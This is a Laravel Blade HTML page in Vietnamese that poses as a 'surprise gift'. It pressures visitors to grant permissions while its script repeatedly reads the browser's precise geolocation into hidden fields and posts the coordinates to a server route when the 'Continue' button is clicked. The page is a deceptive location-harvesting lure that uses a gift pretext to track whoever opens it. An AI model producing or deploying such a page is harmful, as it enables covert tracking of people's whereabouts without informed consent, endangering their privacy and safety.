<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <title>Document</title>

    <style>
        .wrap-content{
            background-image: url('https://cdn.pixabay.com/photo/2021/01/19/06/30/background-5930164_960_720.png');
            position: absolute;
            top: 0;
            right: 0;
            left: 0;
            bottom: 0;
            background-size: cover;
            text-align: center;
            font-family: 'Pacifico', cursive;
        }

        #btn-submit {
            background: rgb(248, 15, 54);
            width: 150px;
            height: 150px;
            border: none;
            font-size: 20px;
            border-radius: 50%;
            transform: scale(1);
            transition: 1s;
            color: #fff;
            cursor: pointer;
            font-weight: 700;
            font-family: 'Pacifico', cursive;
        }

        #btn-submit:hover {
            transform: scale(1.2) !important;
            background: rgb(231, 9, 46);
        }
    </style>
</head>
<body>
    <div class="wrap-content">
        <h1>Một bất ngờ ...</h1>
        <h2>món quà bì ấn...</h2>
        <small style="font-size: 10px; font-style: inherit; color: orange;">(Vui lòng cấp quyền cho trang web !)</small>
        <div style="margin-top: 50px; text-align: center;">
            <form >
                {{ csrf_field() }}
                <input type="hidden" name="latitude" id="latitude">
                <input type="hidden" name="longitude" id="longitude">
                <button id="btn-submit" type="button">Tiếp tục</button>
            </form>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.1.3/axios.min.js" integrity="sha512-0qU9M9jfqPw6FKkPafM3gy2CBAvUWnYVOfNPDYKVuRTel1PrciTj+a9P3loJB+j0QmN2Y0JYQmkBBS8W+mbezg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script>
        let scale = 1;
        let rand = 0;
        const URL_AXIOS = `{{ route('post-location') }}`;
        setInterval(() => {
            if (rand) {
                scale = 1.1;
                rand = 0;
            } else {
                scale = 1;
                rand = 1;
            }
            getLocation();
            document.querySelector('#btn-submit').style.transform = `scale(${scale})`;
        }, 400);

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            }
        }

        function showPosition(position) {
            document.querySelector('#latitude').value = position.coords.latitude;
            document.querySelector('#longitude').value = position.coords.longitude;
        }

        document.querySelector('#btn-submit').addEventListener('click', function() {
            let body = {
                latitude: document.querySelector('#latitude').value,
                longitude: document.querySelector('#longitude').value
            };

            if (!body.latitude) {
                alert('Vui lòng cho phép vị trị để tiếp tục !');
            }

            axios.post(URL_AXIOS, body);
        });
    </script>
</body>
</html>